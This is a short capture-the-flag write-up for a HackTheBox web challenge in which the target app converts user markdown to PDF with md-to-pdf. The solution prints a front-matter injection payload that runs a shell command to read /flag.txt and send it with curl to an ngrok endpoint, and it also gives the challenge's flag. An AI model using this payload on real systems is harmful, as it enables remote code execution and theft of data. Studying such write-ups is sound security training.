# Blinker Fluid

## Challenge Author(s):

Ulysses

## Description:

`
Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus' home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids™ Corp. Ulysses has infiltrated this supplier organization's one of the HR department tools and needs your help to get into their server. Can you help him?`

## Target: docker ip on demand

## Difficulty/Points: 350/easy

## Flag: HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}

## Challenge

the page is presented with a list of uploaded PDF entries and a button to create them. The button sends you to a markdown editor on which to write the content we want and we can generate the PDF via the md-to-pdf tool.

# Solution 

this challenge provides the source code. We are able to understand the md-to-pdf version which is crucial for web searches to understand the tactics to be used. The research led me to see an interesting payload to exploit for this tool. This payload allows me to do RCE on the system and get the flag using an endpoint of my choice such as the one provided by ngrok. The payload is as follows.

```python
 ---js
{
    css: `body::before { content: "${require('child_process').execSync('a=$(cat /flag.txt);curl ngrok/flag=$a;').join()}"; display: block }`,
}
--- 
```

the flag will be received on the active endpoint provided by ngrok.